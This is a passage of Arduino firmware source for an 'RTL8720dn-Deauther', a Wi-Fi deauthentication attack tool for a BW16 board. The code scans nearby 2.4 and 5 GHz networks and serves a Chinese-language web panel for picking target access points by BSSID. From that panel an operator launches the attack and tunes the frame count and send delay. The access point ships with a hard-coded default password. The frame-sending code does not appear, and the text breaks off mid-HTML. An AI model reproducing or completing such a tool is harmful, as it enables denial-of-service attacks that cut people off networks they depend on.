#include "vector"
#include "wifi_conf.h"
#include "map"
#include "stddef.h"
#include "FlashMemory.h"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

#include "lwip/init.h"
#include "lwip/netif.h"

extern "C" {
void sys_reset(void);
void dhcps_deinit(void);
void dhcps_init(struct netif *pnetif);
extern struct netif xnetif[];
}

// LEDs:
//  Red: System usable, Web server active etc.
//  Green: Web Server communication happening
//  Blue: Deauth-Frame being sent

typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
} WiFiScanResult;

const char *DEFAULT_SSID = "BW16"; // 默认 WiFi 名称
const char *DEFAULT_PASS = "1234567890";             // 默认 WiFi 密码 (8~63位，留空为开放网络)
const uint8_t DEFAULT_IP[4] = {192, 168, 1, 1};      // 默认后台管理 IP
const uint8_t DEFAULT_MASK[4] = {255, 255, 255, 0};  // 默认子网掩码
const bool DEFAULT_DHCP = true;                      // 默认开启 DHCP 服务

#define NET_CFG_MAGIC 0x42573138UL

typedef struct __attribute__((packed)) {
  uint32_t magic;
  char ssid[33];
  char pass[65];
  uint8_t ip[4];
  uint8_t mask[4];
  uint8_t dhcp_enabled;
  uint32_t checksum;
} NetConfig;

NetConfig net_cfg;
char *ssid = net_cfg.ssid;
char *pass = net_cfg.pass;

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
std::map<int, std::vector<int>> deauth_channels;
std::vector<int> chs_idx;
uint32_t current_ch_idx = 0;
uint32_t sent_frames = 0;

WiFiServer server(80);
uint8_t deauth_bssid[6];
uint16_t deauth_reason = 2;

int frames_per_deauth = 5;
int send_delay = 5;
bool isDeauthing = false;
bool led = true;

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}

uint32_t calcConfigChecksum(const uint8_t *data, size_t len) {
  uint32_t hash = 2166136261UL;
  for (size_t i = 0; i < len; i++) {
    hash ^= data[i];
    hash *= 16777619UL;
  }
  return hash;
}

uint32_t ipv4ToUint32(const uint8_t ip[4]) {
  return ((uint32_t)ip[0] << 24) | ((uint32_t)ip[1] << 16) | ((uint32_t)ip[2] << 8) | (uint32_t)ip[3];
}

bool isValidSubnetMask(const uint8_t mask[4]) {
  uint32_t m = ipv4ToUint32(mask);
  // 允许 /8 (255.0.0.0) ~ /30 (255.255.255.252) 的连续子网掩码
  if (m < 0xFF000000UL || m > 0xFFFFFFFCUL) return false;
  uint32_t inv = ~m;
  return (inv & (inv + 1UL)) == 0;
}

bool isValidHostIPv4(const uint8_t ip[4], const uint8_t mask[4]) {
  if (!isValidSubnetMask(mask)) return false;
  if (ip[0] == 0 || ip[0] == 127 || ip[0] >= 224) return false;
  uint32_t ip_u = ipv4ToUint32(ip);
  uint32_t mask_u = ipv4ToUint32(mask);
  uint32_t host = ip_u & ~mask_u;
  if (host == 0 || host == ~mask_u) return false;
  return true;
}

bool parseRawIPv4(const String &ip_str, uint8_t out_ip[4]) {
  String s = ip_str;
  s.trim();
  int len = s.length();
  if (len < 7 || len > 15) return false;

  int part = 0;
  int val = 0;
  int digits = 0;

  for (int i = 0; i <= len; i++) {
    char c = (i < len) ? s[i] : '.';
    if (c >= '0' && c <= '9') {
      if (digits == 1 && val == 0) return false;
      val = val * 10 + (c - '0');
      digits++;
      if (digits > 3 || val > 255) return false;
    } else if (c == '.') {
      if (digits == 0 || part >= 4) return false;
      out_ip[part++] = (uint8_t)val;
      val = 0;
      digits = 0;
    } else {
      return false;
    }
  }

  return part == 4;
}

String formatIPv4(const uint8_t ip[4]) {
  return String(ip[0]) + "." + String(ip[1]) + "." + String(ip[2]) + "." + String(ip[3]);
}

String getCurrentIPString() {
  IPAddress cur = WiFi.localIP();
  if (cur[0] == 0 && cur[1] == 0 && cur[2] == 0 && cur[3] == 0) {
    return formatIPv4(net_cfg.ip);
  }
  return String(cur[0]) + "." + String(cur[1]) + "." + String(cur[2]) + "." + String(cur[3]);
}

void setDefaultNetConfig() {
  memset(&net_cfg, 0, sizeof(NetConfig));
  net_cfg.magic = NET_CFG_MAGIC;
  strncpy(net_cfg.ssid, DEFAULT_SSID, sizeof(net_cfg.ssid) - 1);
  strncpy(net_cfg.pass, DEFAULT_PASS, sizeof(net_cfg.pass) - 1);
  memcpy(net_cfg.ip, DEFAULT_IP, 4);
  memcpy(net_cfg.mask, DEFAULT_MASK, 4);
  net_cfg.dhcp_enabled = DEFAULT_DHCP ? 1 : 0;
  net_cfg.checksum = calcConfigChecksum((const uint8_t *)&net_cfg, offsetof(NetConfig, checksum));
}

void loadNetConfig() {
  setDefaultNetConfig();
  FlashMemory.read();
  if (FlashMemory.buf == NULL) return;

  NetConfig stored;
  memcpy(&stored, FlashMemory.buf, sizeof(NetConfig));
  stored.ssid[sizeof(stored.ssid) - 1] = '\0';
  stored.pass[sizeof(stored.pass) - 1] = '\0';

  uint32_t expected = calcConfigChecksum((const uint8_t *)&stored, offsetof(NetConfig, checksum));
  size_t ssid_len = strlen(stored.ssid);
  size_t pass_len = strlen(stored.pass);

  if (stored.magic == NET_CFG_MAGIC &&
      stored.checksum == expected &&
      ssid_len >= 1 && ssid_len <= 32 &&
      (pass_len == 0 || (pass_len >= 8 && pass_len <= 63)) &&
      isValidSubnetMask(stored.mask) &&
      isValidHostIPv4(stored.ip, stored.mask) &&
      (stored.dhcp_enabled == 0 || stored.dhcp_enabled == 1)) {
    memcpy(&net_cfg, &stored, sizeof(NetConfig));
  }
}

void saveNetConfig() {
  net_cfg.magic = NET_CFG_MAGIC;
  net_cfg.ssid[sizeof(net_cfg.ssid) - 1] = '\0';
  net_cfg.pass[sizeof(net_cfg.pass) - 1] = '\0';
  net_cfg.checksum = calcConfigChecksum((const uint8_t *)&net_cfg, offsetof(NetConfig, checksum));

  FlashMemory.read();
  if (FlashMemory.buf != NULL) {
    memcpy(FlashMemory.buf, &net_cfg, sizeof(NetConfig));
    FlashMemory.update();
  }
}

void startAP() {
  IPAddress local_ip(net_cfg.ip[0], net_cfg.ip[1], net_cfg.ip[2], net_cfg.ip[3]);
  IPAddress gateway(net_cfg.ip[0], net_cfg.ip[1], net_cfg.ip[2], net_cfg.ip[3]);
  IPAddress subnet(net_cfg.mask[0], net_cfg.mask[1], net_cfg.mask[2], net_cfg.mask[3]);

  WiFi.config(local_ip, gateway, gateway, subnet);

  char ch_buf[8];
  snprintf(ch_buf, sizeof(ch_buf), "%d", current_channel);
  if (strlen(net_cfg.pass) >= 8) {
    WiFi.apbegin(net_cfg.ssid, net_cfg.pass, ch_buf);
  } else {
    WiFi.apbegin(net_cfg.ssid, ch_buf);
  }

  dhcps_deinit();
#if defined(LWIP_VERSION_MAJOR) && (LWIP_VERSION_MAJOR >= 2)
  ip4_addr_t ipaddr, netmask, gw;
#else
  struct ip_addr ipaddr, netmask, gw;
#endif
  IP4_ADDR(&ipaddr, net_cfg.ip[0], net_cfg.ip[1], net_cfg.ip[2], net_cfg.ip[3]);
  IP4_ADDR(&netmask, net_cfg.mask[0], net_cfg.mask[1], net_cfg.mask[2], net_cfg.mask[3]);
  IP4_ADDR(&gw, net_cfg.ip[0], net_cfg.ip[1], net_cfg.ip[2], net_cfg.ip[3]);
  netif_set_addr(&xnetif[0], &ipaddr, &netmask, &gw);
  netif_set_up(&xnetif[0]);
  if (net_cfg.dhcp_enabled) {
    dhcps_init(&xnetif[0]);
  }
}

int hexCharToInt(char c) {
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
  return -1;
}

String urlDecode(const String &str) {
  String decoded = "";
  int len = str.length();
  for (int i = 0; i < len; i++) {
    char c = str[i];
    if (c == '+') {
      decoded += ' ';
    } else if (c == '%' && i + 2 < len) {
      int hi = hexCharToInt(str[i + 1]);
      int lo = hexCharToInt(str[i + 2]);
      if (hi >= 0 && lo >= 0) {
        decoded += (char)((hi << 4) | lo);
        i += 2;
      } else {
        decoded += c;
      }
    } else {
      decoded += c;
    }
  }
  return decoded;
}

String htmlEscape(const String &str) {
  String out = "";
  int len = str.length();
  for (int i = 0; i < len; i++) {
    char c = str[i];
    if (c == '&') out += "&amp;";
    else if (c == '<') out += "&lt;";
    else if (c == '>') out += "&gt;";
    else if (c == '"') out += "&quot;";
    else if (c == '\'') out += "&#39;";
    else out += c;
  }
  return out;
}

String readHttpRequest(WiFiClient &client) {
  String request = "";
  unsigned long start_ms = millis();
  int header_end = -1;
  int content_length = 0;

  while (client.connected() && (millis() - start_ms < 1500)) {
    while (client.available()) {
      request += (char)client.read();
      if (header_end == -1 && request.endsWith("\r\n\r\n")) {
        header_end = request.length();
        String lower_headers = request.substring(0, header_end);
        lower_headers.toLowerCase();
        int cl_idx = lower_headers.indexOf("content-length:");
        if (cl_idx != -1) {
          int line_end = lower_headers.indexOf("\r\n", cl_idx);
          String cl_val = lower_headers.substring(cl_idx + 15, line_end != -1 ? line_end : header_end);
          cl_val.trim();
          content_length = cl_val.toInt();
          if (content_length > 2048) content_length = 2048;
        }
        break;
      }
    }
    if (header_end != -1) break;
    delay(2);
  }

  if (header_end != -1 && content_length > 0) {
    unsigned long body_start_ms = millis();
    while (client.connected() &&
           (int)(request.length() - header_end) < content_length &&
           (millis() - body_start_ms < 1500)) {
      while (client.available() && (int)(request.length() - header_end) < content_length) {
        request += (char)client.read();
      }
      if ((int)(request.length() - header_end) < content_length) {
        delay(2);
      }
    }
  }
  return request;
}

String parseRequest(String request) {
  int path_start = request.indexOf(' ');
  if (path_start < 0) return "/";
  path_start += 1;
  int path_end = request.indexOf(' ', path_start);
  if (path_end < 0) return "/";
  String path = request.substring(path_start, path_end);
  int q = path.indexOf('?');
  if (q >= 0) path = path.substring(0, q);
  return path;
}

std::vector<std::pair<String, String>> parsePost(String &request) {
    std::vector<std::pair<String, String>> post_params;

    // Find the start of the body
    int body_start = request.indexOf("\r\n\r\n");
    if (body_start == -1) {
        return post_params; // Return an empty vector if no body found
    }
    body_start += 4;

    // Extract the POST data
    String post_data = request.substring(body_start);

    int start = 0;
    int end = post_data.indexOf('&', start);

    // Loop through the key-value pairs
    while (end != -1) {
        String key_value_pair = post_data.substring(start, end);
        int delimiter_position = key_value_pair.indexOf('=');

        if (delimiter_position != -1) {
            String key = urlDecode(key_value_pair.substring(0, delimiter_position));
            String value = urlDecode(key_value_pair.substring(delimiter_position + 1));
            post_params.push_back({key, value});
        }

        start = end + 1;
        end = post_data.indexOf('&', start);
    }

    // Handle the last key-value pair
    String key_value_pair = post_data.substring(start);
    int delimiter_position = key_value_pair.indexOf('=');
    if (delimiter_position != -1) {
        String key = urlDecode(key_value_pair.substring(0, delimiter_position));
        String value = urlDecode(key_value_pair.substring(delimiter_position + 1));
        post_params.push_back({key, value});
    }

    return post_params;
}

String makeResponse(int code, String content_type) {
  String reason = (code == 200) ? "OK" : ((code == 400) ? "Bad Request" : "Not Found");
  String response = "HTTP/1.1 " + String(code) + " " + reason + "\r\n";
  response += "Content-Type: " + content_type + "; charset=utf-8\r\n";
  response += "Cache-Control: no-store\r\n";
  response += "Connection: close\r\n\r\n";
  return response;
}

String makeRedirect(String url) {
  String response = "HTTP/1.1 303 See Other\r\n";
  response += "Location: " + url + "\r\n";
  response += "Connection: close\r\n\r\n";
  return response;
}

void handleRoot(WiFiClient &client) {
  String response = makeResponse(200, "text/html") + R"(
  <!DOCTYPE html>
  <html lang="zh-CN">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=0.8, minimal-ui">
    <meta name="theme-color" content="#36393E">
    <title>RTL8720dn-Deauther</title>
    <style>
    /* Base on Spacehuhn css file. Copyright (c) 2020 Spacehuhn Technologies: https://github.com/spacehuhntech/esp8266_deauther */
      body {
        background: #36393e;
        color: #bfbfbf;
        font-family: sans-serif;
      }

      h3{
        background: #2f3136;
        color: #bfbfbb;
        padding: .2em 1em;
        border-radius: 3px;
        // border-left: solid #20c20e 5px;
        font-weight: 100;
        text-align: center;
        width: 50%;
      }

      .centered{
        display: flex;
        justify-content: center;
      }
      h1 {
        font-size: 1.7rem;
        margin-top: 1rem;
        background: #2f3136;
        color: #bfbfbb;
        padding: .2em 1em;
        border-radius: 3px;
        border-left: solid #20c20e 5px;
        border-right: solid #20c20e 5px;
        font-weight: 100;
        text-align: center;
      }

      h2 {
        font-size: 1.1rem;
        margin-top: 1rem;
        background: #2f3136;
        color: #bfbfbb;
        padding: .4em 1em;
        border-radius: 3px;
        border-left: solid #20c20e 5px;
        font-weight: 100;
      }

      table {
        border-collapse: collapse;
        width: 100%;
        min-width: auto;
        margin-bottom: 2em;
      }

      td {
        word-break: keep-all;
        // padding: 10px 6px;
        text-align: left;
        border-bottom: 1px solid #5d5d5d;
      }
      
      .tdMeter {
        word-break: break-all;
        // padding: 10px 6px;
        padding-right: 10px;
        text-align: left;
        border-bottom: 1px solid #5d5d5d;
      }

      .tdFixed{
        word-break: keep-all;
        padding: 10px 6px;
        text-align: center;
        border-bottom: 1px solid #5d5d5d;
      }

      th {
          word-break: break-word;
          // padding: 10px 6px;
          text-align: left;
          border-bottom: 1px solid #5d5d5d;
      }

      p {
        margin: .5em 0;
      }
      .bold {
        font-weight: bold;
      }

      .center {
      display: flex;
      justify-content: center;
      align-items: center;
      }

      .container {
        display: flex;
        flex-direction: column;
        width: 100%;
      }

      .checkBoxContainer {
        display: block;
        position: relative;
        padding-left: 25px;
        margin-bottom: 12px;
        cursor: pointer;
        font-size: 22px;
        user-select: none;
        height: 32px;
      }

      .checkBoxContainer input {
        position: absolute;
        opacity: 0;
        cursor: pointer;
      }

      .checkmark {
        position: absolute;
        top: 8px;
        left: 0;
        height: 28px;
        width: 28px;
        background-color: #2F3136;
        border-radius: 4px;
      }

      .checkmark:after {
        content: "";
        position: absolute;
        display: none;
      }

      .checkBoxContainer input:checked ~ .checkmark:after {
        display: block;
      }

      .checkBoxContainer .checkmark:after {
        left: 10px;
        top: 7px;
        width: 4px;
        height: 10px;
        border: solid white;
        border-width: 0 3px 3px 0;
        transform: rotate(45deg);
      }
              /* Meter */
      .meter_background{
        background: #42464D;
        // width: 100%;
        word-break: normal;
        // min-width: 100px;
        // min-width: 45px;
      }
      .meter_forground{
        color: #fff;
        padding: 4px 0;
        /* + one of the colors below
        (width will be set by the JS) */
      }
      .meter_green{
        background: #43B581;
      }
      .meter_orange{
        background: #FAA61A;
      }
      .meter_red{
        background: #F04747;
      }
      .meter_value{
        padding-left: 8px;
      }

      @keyframes fadeIn {
        0% {
            opacity: 0;
        }
        100% {
            opacity: 1;
        }
      }

      hr {
        background: #3e4146;
      }
      
      .button-container {
        display: flex; /* Usar flexbox */
        justify-content: start; /* Espacio entre los botones */
        align-items: center; /* Centra los elementos horizontalmente */
        align-content: center;
        column-gap: 15px;
      }

      .button-double{
        display: flex; /* Usar flexbox */
        flex-direction: column;
        justify-content: start; /* Espacio entre los botones */
        align-items: center; /* Centra los elementos horizontalmente */
        align-content: center;
        row-gap: 15px;
      }

      .upload-script,
      .button,
      button,
      input[type=submit],
      input[type=reset],
      input[type=button] {
        display: inline-block;
        height: 38px;
        // padding: 0 20px;
        color: #fff;
        text-align: center;
        font-size: 11px;
        font-weight: 600;
        line-height: 38px;
        letter-spacing: .1rem;
        text-transform: uppercase;
        text-decoration: none;
        white-space: nowrap;
        background: #2f3136;
        border-radius: 4px;
        border: 0;
        cursor: pointer;
        box-sizing: border-box;
      }

      button:hover,
      input[type=submit]:hover,
      input[type=reset]:hover,
      input[type=button]:hover {
        background: #42444a;
      }

      button:active,
      input[type=submit]:active,
      input[type=reset]:active,
      input[type=button]:active {
        transform: scale(.93);
      }

      button:disabled:hover,
      input[type=submit]:disabled:hover,
      input[type=reset]:disabled:hover,
      input[type=button]:disabled:hover {
        background: white;
        cursor: not-allowed;
        opacity: .40;
        filter: alpha(opacity=40);
        transform: scale(1);
      }

      button::-moz-focus-inner {
        border: 0;
      }

      input[type=email],
      input[type=number],
      input[type=search],
      input[type=text],
      input[type=tel],
      input[type=url],
      input[type=password],
      textarea,
      select {
        text-align: center;
        height: 38px;
        padding: 0 5px;
      }

      .shortInput{
        width: 28px;
      }

      .longInput{
        width: 138px;
      }
    </style>
  </head>
  <body>
  <div class="container">
    <h1 class="bold">RTL8720dn-Deauther</h1>
      <div class="center">
        <div class="button-container">
          <form method="post" action="/rescan">
              <input type="submit" value="刷新网络">
          </form>
          <form method="post" action="/refresh">
              <input type="submit" value="刷新页面">
          </form>
          <form method="get" action="/wifi">
              <input type="submit" value="WiFi / IP 设置" style="border: 1px solid #20c20e; padding: 0 12px;">
          </form>
        </div>
      </div>
      <form method="post" action="/deauth">
      <h2>接入点: )" + String(scan_results.size()) + R"(</h2>
      <div class="centered">
        <h3 class="bold">5 GHz 网络</h3>  
      </div>
        <table>
          <tr>
            <th>SSID</th>
            <th class='tdFixed'>CH</th>
            <th>BSSID</th>
            <th>RSSI</th>
            <th class='tdFixed'></th>
            <th class='selectColumn'></th>
          </tr>
  )";

  for (uint32_t i = 0; i < scan_results.size(); i++) {
    if (scan_results[i].channel >= 36) {
      String color = "";
      int width = scan_results[i].rssi + 120;
      int colorWidth = scan_results[i].rssi + 130;

      if (colorWidth < 50) color = "meter_red";
      else if (colorWidth < 70) color = "meter_orange";
      else color = "meter_green";

      response += "<tr>";
      response += "<td>" + String((scan_results[i].ssid.length() > 0) ? scan_results[i].ssid : "**HIDDEN**") + "</td>";
      response += "<td class='tdFixed'>" + String(scan_results[i].channel) + "</td>";
      response += "<td>" + scan_results[i].bssid_str + "</td>";
      response += "<td class='tdMeter'><div class='meter_background'> <div class='meter_forground " + String(color) + "' style='width: " + String(width) + "%'><div class='meter_value'>" + String(scan_results[i].rssi) + "</div></div></div></td>";
      response += "<td><label class='checkBoxContainer'><input type='checkbox' name='network' value='" + String(i) + "'><span class='checkmark'></span></label></td>";
      response += "</tr>";
    }
  }
  response += R"(
        </table>
        <div class="centered">
          <h3 class="bold">2.4 GHz 网络</h3>  
        </div>
          <table>
            <tr>
              <th>SSID</th>
              <th class='tdFixed'>CH</th>
              <th>BSSID</th>
              <th>RSSI</th>
              <th class='tdFixed'></th>
              <th class='selectColumn'></th>
            </tr>
  )";

  for (uint32_t i = 0; i < scan_results.size(); i++) {
    if (scan_results[i].channel <= 14) {
      String color = "";
      int width = scan_results[i].rssi + 120;
      int colorWidth = scan_results[i].rssi + 130;

      if (colorWidth < 50) color = "meter_red";
      else if (colorWidth < 70) color = "meter_orange";
      else color = "meter_green";
      
      response += "<tr>";
      response += "<td>" + String((scan_results[i].ssid.length() > 0) ? scan_results[i].ssid : "**HIDDEN**") + "</td>";
      response += "<td class='tdFixed'>" + String(scan_results[i].channel) + "</td>";
      response += "<td>" + scan_results[i].bssid_str + "</td>";
      response += "<td class='tdMeter'><div class='meter_background'> <div class='meter_forground " + String(color) + "' style='width: " + String(width) + "%'><div class='meter_value'>" + String(scan_results[i].rssi) + "</div></div></div></td>";
      response += "<td><label class='checkBoxContainer'><input type='checkbox' name='network' value='" + String(i) + "'><span class='checkmark'></span></label></td>";
      response += "</tr>";
    }
  }
  response += R"(
        </table>
            <div class="center">
              <div class="button-container">
                <input type="submit" value="攻击!">  
              </div>
            </div>
      </form>
      <div class="center">
        <form method="post" action="/stop">
          <div class="button-container">
            <input type="submit" value="停止">
          </div>
        </form>
      </div>
      <h2>面板</h2>
    <table>
      <tr><th>状态</th><th>当前状态</th></tr>
  )";
  response += "<tr><td>热点名称 (SSID)</td><td>" + htmlEscape(String(net_cfg.ssid)) + "</td></tr>";
  response += "<tr><td>后台管理 IP</td><td>" + getCurrentIPString() + "</td></tr>";
  response += "<tr><td>子网掩码</td><td>" + formatIPv4(net_cfg.mask) + "</td></tr>";
  response += "<tr><td>DHCP 服务</td><td>" + String(net_cfg.dhcp_enabled ? "开启" : "关闭") + "</td></tr>";
  response += "<tr><td>攻击状态</td><td>" + String(isDeauthing ? "运行" : "停止") + "</td></tr>";
  response += "<tr><td>LED启用</td><td>" + String(led ? "是" : "否") + "</td></tr>";
  response += "<tr><td>发送帧数</td><td>" + String(sent_frames) + "</td></tr>";
  response += "<tr><td>发送延迟</td><td>" + String(send_delay) + "</td></tr>";
  response += "<tr><td>每次发送的帧数</td><td>" + String(frames_per_deauth) + "</td></tr>";
  response += "</table>";
  response += "<h2>设置</h2>";
  response += "<div class=\"center\">";
  response += "<div class=\"button-double\">";
  response += "<form method=\"post\" action=\"/setframes\">";
  response += "<div class=\"button-container\">";
  response += "<input class=\"longInput\" type=\"text\" name=\"frames\" placeholder=\"每次发送的帧数\">";
  response += "<input type=\"submit\" value=\"设置帧数\">";
  response += "</div>";
  response += "</form>";

  response += "<form method=\"post\" action=\"/setdelay\">";
  response += "<div class=\"button-container\">";
  response += "<input class=\"longInput\" type=\"text\" name=\"delay\" placeholder=\"发送延迟(ms)\">";
  response += "<input type=\"submit\" value=\"设置延迟\">";
  response += "</div>";
  response += "</form>";
  response += "</div>";
  response += "</div>";

  response += "<h2>LED选项</h2>";
  response += "<div class=\"center\">";
  response += "<div class=\"button-container\">";
  response += "<form method=\"post\" action=\"/led_enable\">";
  response += "<input class=\"green\" type=\"submit\" value=\"开\">";
  response += "</form>";

  response += "<form method=\"post\" action=\"/led_disable\">";
  response += "<input class=\"red\" type=\"submit\" value=\"关\">";
  response += "</form>";
  response += "</div>";
  response += "</div>";
  response += "</div>";
  response += "</body>";
  response += "</html>";

  client.write(response.c_str());
}

void handleWiFiConfig(WiFiClient &client) {
  String cur_ssid = htmlEscape(String(net_cfg.ssid));
  String cur_pass = htmlEscape(String(net_cfg.pass));
  String cur_ip = getCurrentIPString();
  String cur_mask = formatIPv4(net_cfg.mask);
  String sec_mode = (strlen(net_cfg.pass) >= 8) ? "WPA2-PSK" : "开放网络 (无密码)";
  String dhcp_status = net_cfg.dhcp_enabled ? "开启" : "关闭 (需手动配置静态 IP)";
  String dhcp_checked = net_cfg.dhcp_enabled ? "checked" : "";
  String dhcp_warn_style = net_cfg.dhcp_enabled ? "display:none;" : "display:block;";

  String response = makeResponse(200, "text/html") + R"RAW(
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimal-ui">
  <meta name="theme-color" content="#36393E">
  <title>WiFi / IP 设置 - RTL8720dn-Deauther</title>
  <style>
    * { box-sizing: border-box; }
    body {
      background: #36393e;
      color: #dcddde;
      font-family: sans-serif;
      margin: 0;
      padding: 14px;
    }
    .wrap {
      max-width: 520px;
      margin: 0 auto;
    }
    h1 {
      font-size: 1.45rem;
      background: #2f3136;
      color: #fff;
      padding: 12px 16px;
      border-radius: 6px;
      border-left: 5px solid #20c20e;
      border-right: 5px solid #20c20e;
      text-align: center;
      margin: 0 0 16px 0;
    }
    h2 {
      font-size: 1.05rem;
      background: #2f3136;
      color: #dcddde;
      padding: 8px 14px;
      border-radius: 4px;
      border-left: 4px solid #20c20e;
      margin: 16px 0 10px 0;
    }
    .card {
      background: #2f3136;
      border-radius: 6px;
      padding: 16px;
      margin-bottom: 14px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
    }
    td {
      padding: 8px 4px;
      border-bottom: 1px solid #454950;
      font-size: 14px;
    }
    td:first-child { color: #9ea3a8; width: 42%; }
    .field { margin-bottom: 14px; }
    label {
      display: block;
      margin-bottom: 6px;
      font-size: 14px;
      font-weight: 600;
    }
    input[type=text], input[type=password] {
      width: 100%;
      height: 40px;
      padding: 0 12px;
      border-radius: 4px;
      border: 1px solid #4f545c;
      background: #202225;
      color: #fff;
      font-size: 15px;
    }
    input[type=text]:focus, input[type=password]:focus {
      outline: none;
      border-color: #20c20e;
    }
    .hint {
      font-size: 12px;
      color: #9ea3a8;
      margin-top: 5px;
      line-height: 1.45;
    }
    .presets {
      display: flex;
      flex-wrap: wrap;
      gap: 6px;
      margin-top: 6px;
    }
    .preset-btn {
      background: #3a3d44;
      color: #dcddde;
      border: 1px solid #4f545c;
      border-radius: 4px;
      padding: 4px 8px;
      font-size: 12px;
      cursor: pointer;
    }
    .preset-btn:hover { background: #4f545c; }
    .toggle-row {
      margin-top: 6px;
      font-size: 13px;
      color: #b9bbbe;
      display: flex;
      align-items: center;
      gap: 6px;
      cursor: pointer;
      font-weight: normal;
    }
    .switch-row {
      display: flex;
      align-items: center;
      justify-content: space-between;
      background: #202225;
      border: 1px solid #4f545c;
      border-radius: 4px;
      padding: 10px 12px;
      cursor: pointer;
      font-weight: 600;
      margin-bottom: 0;
    }
    .switch-row input[type=checkbox] {
      width: 18px;
      height: 18px;
      accent-color: #20c20e;
      cursor: pointer;
    }
    .warn {
      background: #4e3b1c;
      border-left: 4px solid #faa61a;
      color: #ffe2b3;
      padding: 8px 10px;
      border-radius: 4px;
      margin-top: 8px;
      font-size: 12px;
      line-height: 1.5;
    }
    .actions {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      margin-top: 16px;
    }
    .btn {
      flex: 1;
      min-width: 130px;
      height: 42px;
      line-height: 42px;
      border: 0;
      border-radius: 4px;
      color: #fff;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      text-align: center;
      text-decoration: none;
      display: inline-block;
    }
    .btn-primary { background: #20a80e; }
    .btn-primary:hover { background: #26c212; }
    .btn-secondary { background: #4f545c; }
    .btn-secondary:hover { background: #5d636c; }
    .btn-danger { background: #c0392b; }
    .btn-danger:hover { background: #d64536; }
    .err {
      display: none;
      background: #5c2323;
      border-left: 4px solid #f04747;
      color: #ffd6d6;
      padding: 10px 12px;
      border-radius: 4px;
      margin-bottom: 12px;
      font-size: 13px;
    }
  </style>
</head>
<body>
<div class="wrap">
  <h1>WiFi / IP 网络设置</h1>

  <h2>当前生效状态</h2>
  <div class="card">
    <table>
      <tr><td>当前 WiFi 名称</td><td>)RAW" + cur_ssid + R"RAW(</td></tr>
      <tr><td>当前加密方式</td><td>)RAW" + sec_mode + R"RAW(</td></tr>
      <tr><td>当前管理 IP</td><td>)RAW" + cur_ip + R"RAW(</td></tr>
      <tr><td>当前子网掩码</td><td>)RAW" + cur_mask + R"RAW(</td></tr>
      <tr><td>DHCP 服务</td><td>)RAW" + dhcp_status + R"RAW(</td></tr>
    </table>
  </div>

  <h2>修改热点与网络参数</h2>
  <div class="card">
    <div id="errBox" class="err"></div>
    <form id="wifiForm" method="post" action="/setwifi" onsubmit="return validateForm()">
      <div class="field">
        <label for="ssid">WiFi 名称 (SSID)</label>
        <input id="ssid" type="text" name="ssid" maxlength="32" required value=")RAW" + cur_ssid + R"RAW(">
        <div class="hint">长度 1~32 字节（支持英文、数字、符号及中文）。</div>
      </div>

      <div class="field">
        <label for="pass">WiFi 密码</label>
        <input id="pass" type="password" name="pass" maxlength="63" value=")RAW" + cur_pass + R"RAW(">
        <label class="toggle-row">
          <input type="checkbox" onclick="document.getElementById('pass').type = this.checked ? 'text' : 'password'">
          显示密码
        </label>
        <div class="hint">WPA2 加密需 8~63 位字符；留空则设为无密码开放热点。</div>
      </div>

      <div class="field">
        <label for="ip">后台管理 IP 地址</label>
        <input id="ip" type="text" name="ip" maxlength="15" required value=")RAW" + cur_ip + R"RAW(" placeholder="例如: 192.168.4.1">
        <div class="hint">例如 192.168.1.1、192.168.8.1、10.0.0.1（需为所选子网掩码内的有效主机 IP）。</div>
      </div>

      <div class="field">
        <label for="mask">子网掩码</label>
        <input id="mask" type="text" name="mask" maxlength="15" required value=")RAW" + cur_mask + R"RAW(" placeholder="例如: 255.255.255.0">
        <div class="presets">
          <button type="button" class="preset-btn" onclick="setMask('255.255.255.0')">/24 (255.255.255.0)</button>
          <button type="button" class="preset-btn" onclick="setMask('255.255.0.0')">/16 (255.255.0.0)</button>
          <button type="button" class="preset-btn" onclick="setMask('255.0.0.0')">/8 (255.0.0.0)</button>
        </div>
        <div class="hint">支持 /8 ~ /30 连续子网掩码（如 255.255.255.0、255.255.255.128）。</div>
      </div>

      <div class="field">
        <label>DHCP 服务开关</label>
        <label class="switch-row">
          <span>启用 DHCP 自动分配 IP</span>
          <input id="dhcp" type="checkbox" name="dhcp" value="1" )RAW" + dhcp_checked + R"RAW( onchange="toggleDhcpWarn()">
        </label>
        <div class="hint">开启后连接热点的设备会自动获取 IP；关闭后不分配 IP，需客户端手动设置同网段静态 IP。</div>
        <div id="dhcpWarn" class="warn" style=")RAW" + dhcp_warn_style + R"RAW(">注意：关闭 DHCP 后，设备重启完成时手机/电脑连接热点将无法自动获得 IP，请手动配置与管理 IP 同网段的静态 IP 及对应子网掩码后再访问后台。</div>
      </div>

      <div class="actions">
